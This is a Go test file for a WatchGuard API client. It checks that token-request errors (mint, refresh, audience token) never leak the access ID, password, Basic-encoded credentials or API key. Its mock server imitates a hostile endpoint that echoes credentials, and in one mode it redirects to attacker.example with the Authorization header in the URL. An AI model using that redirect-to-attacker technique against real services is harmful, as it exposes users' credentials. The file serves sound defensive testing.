// Copyright 2026 Servosity Inc. and msp-skills contributors. Licensed under Apache-2.0. See LICENSE.

package client

import (
	"context"
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"
	"time"

	"watchguard-pp-cli/internal/config"
)

const (
	echoAccessID = "test-access-id"
	echoPassword = "test-secret-pw"
	echoAPIKey   = "test-api-key"
)

// echoingTokenServer answers token requests by echoing the credentials back:
// mode "raw" the Authorization header, "decoded" the decoded id:password,
// "json" the header JSON-escaped, "redirect" a 302 whose Location carries it.
func echoingTokenServer(t *testing.T, mode *string) *httptest.Server {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		auth := r.Header.Get("Authorization")
		decoded, _ := base64.StdEncoding.DecodeString(strings.TrimPrefix(auth, "Basic "))
		switch *mode {
		case "redirect":
			http.Redirect(w, r, "http://attacker.example/x?h="+url.QueryEscape(auth), http.StatusFound)
		case "decoded":
			w.WriteHeader(http.StatusUnauthorized)
			_, _ = w.Write([]byte("invalid client " + string(decoded)))
		case "json":
			b, _ := json.Marshal(map[string]string{"error": "invalid_client", "received": auth + "<" + string(decoded) + ">"})
			w.WriteHeader(http.StatusUnauthorized)
			_, _ = w.Write(b)
		default:
			w.WriteHeader(http.StatusUnauthorized)
			_, _ = w.Write([]byte(`{"error":"invalid_client","authorization":"` + auth + `"}`))
		}
	}))
	t.Cleanup(srv.Close)
	return srv
}

func assertNoCredentialEcho(t *testing.T, label string, err error) {
	t.Helper()
	if err == nil {
		t.Fatalf("%s: want an error", label)
	}
	b64 := base64.StdEncoding.EncodeToString([]byte(echoAccessID + ":" + echoPassword))
	for _, s := range []string{echoPassword, echoAccessID + ":" + echoPassword, b64, b64[:20], echoAPIKey} {
		if strings.Contains(err.Error(), s) {
			t.Errorf("%s: error echoes %q: %v", label, s, err)
		}
	}
}

// hand-fix (handfixes.json token-error-withholds-credentials): every token
// request path (own-token mint, refresh, audience token) withholds an error
// body or redirect that echoes the Access ID, API password, their Basic
// encoding or the API key.
func TestTokenEndpointErrorsNeverEchoCredentials(t *testing.T) {
	mode := ""
	srv := echoingTokenServer(t, &mode)
	t.Setenv("WATCHGUARD_CLIENT_ID", "")
	t.Setenv("WATCHGUARD_CLIENT_SECRET", "")
	t.Setenv("WATCHGUARD_OAUTH_SCOPE", "")
	newClient := func() *Client {
		return New(&config.Config{BaseURL: srv.URL, TokenURL: srv.URL + "/oauth/token", ClientID: echoAccessID, ClientSecret: echoPassword, WatchguardApiKey: echoAPIKey, RefreshToken: "Refresh-SENTINEL-1"}, 5*time.Second, 0)
	}
	ctx := context.Background()
	for _, m := range []string{"raw", "decoded", "json", "redirect"} {
		mode = m
		assertNoCredentialEcho(t, m+" mint", newClient().mintClientCredentials(ctx, echoAccessID, echoPassword))
		_, _, err := newClient().ScopedBearer(ctx, "aud-"+m)
		assertNoCredentialEcho(t, m+" audience token", err)
		err = newClient().refreshAccessToken(ctx)
		assertNoCredentialEcho(t, m+" refresh", err)
		if err != nil && strings.Contains(err.Error(), "Refresh-SENTINEL-1") {
			t.Errorf("%s refresh echoes the refresh token: %v", m, err)
		}
	}
}
